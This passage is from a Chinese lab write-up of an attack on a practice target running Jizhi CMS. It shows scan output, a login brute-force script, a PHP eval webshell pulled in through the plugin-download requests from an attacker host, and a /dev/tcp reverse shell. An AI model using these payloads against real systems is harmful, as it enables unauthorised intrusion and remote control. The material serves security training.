 http://192.168.200.12:8888/extjs/resources/charts.swf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:55] 200 -    4KB - /favicon.ico</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:20] 200 -  595B  - /login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:58] 403 -  234B  - /public</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:04] 200 -   26B  - /robots.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:19] 401 -  338B  - /static/api/swagger.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:19] 401 -  338B  - /static/api/swagger.yaml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:19] 401 -  338B  - /static/dump.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:27] 200 -   43KB - /tips</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:39] 401 -  338B  - /web/static/c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">http://192.168.200.12:81/</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[20:57:56] 200 -  479B  - /404.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:57:59] 301 -  162B  - /A  -&gt;  http://192.168.200.12:81/A/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:06] 302 -    0B  - /admin.php  -&gt;  http://192.168.200.12:81/admin.php/Login/index.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:39] 301 -  162B  - /backup  -&gt;  http://192.168.200.12:81/backup/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:39] 403 -  548B  - /backup/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:45] 301 -  162B  - /cache  -&gt;  http://192.168.200.12:81/cache/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:58:45] 403 -  548B  - /cache/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:11] 200 -    4KB - /favicon.ico</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:24] 200 -   14KB - /index.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:25] 200 -  917B  - /index.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:25] 200 -    0B  - /index.php/login/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:26] 301 -  162B  - /install  -&gt;  http://192.168.200.12:81/install/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:26] 200 -   75B  - /install/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[20:59:26] 200 -   75B  - /install/index.php?upgrade/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:13] 403 -  548B  - /Public/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:16] 200 -   22KB - /readme.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:18] 200 -  157B  - /robots.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:26] 200 -  495B  - /sitemap.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:30] 301 -  162B  - /static  -&gt;  http://192.168.200.12:81/static/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[21:00:47] 200 -  816B  - /web.config</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同时，直接访问 <code>http://192.168.200.12:8888</code> 可以看到</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241159-205926-2e0011d17a37ad8b4f9fce7646cf6ac0.png" width="1605" height="727" class="img_ev3q"></p>
<p>很明显是宝塔面板的管理入口</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web-1921682001281-侦察">Web <code>192.168.200.12:81</code> 侦察<a href="#web-1921682001281-侦察" class="hash-link" aria-label="web-1921682001281-侦察的直接链接" title="web-1921682001281-侦察的直接链接">​</a></h2>
<p>后台登陆界面位于 <code>http://192.168.200.12:81/admin.php/Login/index.html</code></p>
<p>尝试抓包进行重放，发现验证码是可以固定不变的</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241113-211329-34c78e5da3c3a688d0f40d800cef9e30.png" width="2001" height="973" class="img_ev3q"></p>
<p>尝试使用用户名 <code>admin</code> 进行密码爆破</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reqUrl </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://192.168.200.12:81/admin.php/Login/index.html&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">headersList </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;Accept&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*/*&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;Cookie&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;6bd36d3c4ffe7b8102c6b8e9787ec68b=b942a957-01b3-4b3d-b523-6a33430f1881.FgZCvCwFC_6Q9s5kTqizFq8f58A; PHPSESSID=bb3jftijfat5cr4vckgffneoap&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;Content-Type&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;cache=0.02202580841627977&amp;username=admin&amp;password={PASS}&amp;vercode=865f&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag_failed </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">r&#x27;{&quot;code&quot;:1,&quot;msg&quot;:&quot;\u8d26\u6237\u5bc6\u7801\u9519\u8bef\uff01&quot;}&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./top1000.txt&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;r&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        response </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">request</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;POST&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> reqUrl</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PASS</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> headers</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">headersList</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> response</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> flag_failed</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;*&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>得到用户密码为 <code>admin123</code></p>
<p>成功登录后台</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241141-214105-4b95dc8062e7a2c73117ee5a85b6bb57.png" width="2559" height="1371" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="centos-极致-cms-文件上传构建-webshell">centos 极致 CMS 文件上传构建 webshell<a href="#centos-极致-cms-文件上传构建-webshell" class="hash-link" aria-label="centos 极致 CMS 文件上传构建 webshell的直接链接" title="centos 极致 CMS 文件上传构建 webshell的直接链接">​</a></h2>
<p>根据指纹信息 极致 CMS 定位到以下漏洞信息</p>
<p><a href="https://blog.csdn.net/solitudi/article/details/116643890" target="_blank" rel="noopener noreferrer">[代码审计] 极致 CMS1.9.5 存在文件上传漏洞_极致 cms 建站系统 漏洞 - CSDN 博客</a></p>
<p>构造恶意的 zip 文件</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ cat shell.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php @eval($_POST[&#x27;shell&#x27;]) ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ zip -9 shell.zip shell.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  adding: shell.php (stored 0%)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>未知原因，导致我环境的在线插件无法正常工作，直接手动触发下载功能</p></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">POST /admin.php/Plugins/update.html HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: 192.168.200.12:81</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Language: zh-CN,zh;q=0.9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Referer: http://192.168.200.12:81/admin.php/Index/index.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Encoding: gzip, deflate, br</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Cookie: PHPSESSID=m4al43lu13klt51giool3jnt64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection: keep-alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Length: 102</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">action=start-download&amp;filepath=dbrestor&amp;download_url=http%3A%2F%2F192.168.200.129%3A8080%2Fshell%2Ezip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241122-222251-faf3d65ac6e748087ef2471c1ebf5e84.png" width="1792" height="1255" class="img_ev3q"></p>
<p>文件成功下载之后，查看文件体积</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">POST /admin.php/Plugins/update.html HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: 192.168.200.12:81</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Language: zh-CN,zh;q=0.9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Referer: http://192.168.200.12:81/admin.php/Index/index.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Encoding: gzip, deflate, br</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Cookie: PHPSESSID=m4al43lu13klt51giool3jnt64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection: keep-alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Length: 101</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">action=get-file-size&amp;filepath=dbrestor&amp;download_url=http%3A%2F%2F192.168.200.129%3A8080%2Fshell%2Ezip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241125-222515-bcfe6312704af6687b7af55a9049ae0c.png" width="1792" height="1255" class="img_ev3q"></p>
<p>触发解压</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">POST /admin.php/Plugins/update.html HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: 192.168.200.12:81</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Language: zh-CN,zh;q=0.9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Referer: http://192.168.200.12:81/admin.php/Index/index.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Encoding: gzip, deflate, br</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Cookie: PHPSESSID=m4al43lu13klt51giool3jnt64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection: keep-alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Length: 111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">action=file-upzip&amp;filepath=dbrestor&amp;download_url=http%3A%2F%2F192.168.200.129%3A8080%2Fshell%2Ezip&amp;filesize=200</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241132-223233-0e720d20416daf6fc43dd2ecf542b275.png" width="1792" height="1255" class="img_ev3q"></p>
<p>尝试访问上传的 webshell 文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241136-223645-967656487b09171c6a4b9a5f22f33f1d.png" width="1542" height="1040" class="img_ev3q"></p>
<p>成功连接</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="centos-webshell-绕过-disable_functions">centos webshell 绕过 disable_functions<a href="#centos-webshell-绕过-disable_functions" class="hash-link" aria-label="centos webshell 绕过 disable_functions的直接链接" title="centos webshell 绕过 disable_functions的直接链接">​</a></h2>
<p>使用插件查看 disable_functions</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241140-224023-d404e6d9dea73e0277dbb49202465e63.png" width="1542" height="1040" class="img_ev3q"></p>
<p>直接执行 Bypass disable_functions</p>
<p>首先，写入一个 <code>/www/wwwroot/jizhi/shell.sh</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/bin/sh -i &gt;&amp; /dev/tcp/192.168.200.129/3000 0&gt;&amp;1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代  码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后使用插件的 <code>PHP7 GC with Certain Destructors UAF</code> 打开虚拟终端，执行脚本</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(www:/www/wwwroot/jizhi) $ chmod +x shell.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(www:/www/wwwroot/jizhi) $ ./shell.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241144-224446-b0027590dba2f47640f363adb0893383.png" width="2174" height="1111" class="img_ev3q"></p>
<p>即可得到 <code>centos</code> 的 <code>www</code> 用户的终端</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="centos-提权至-root">centos 提权至 root<a href="#centos-提权至-root" class="hash-link" aria-label="centos 提权至 root的直接链接" title="centos 提权至 root的直接链接">​</a></h2>
<p>进行一个基础探测</p>
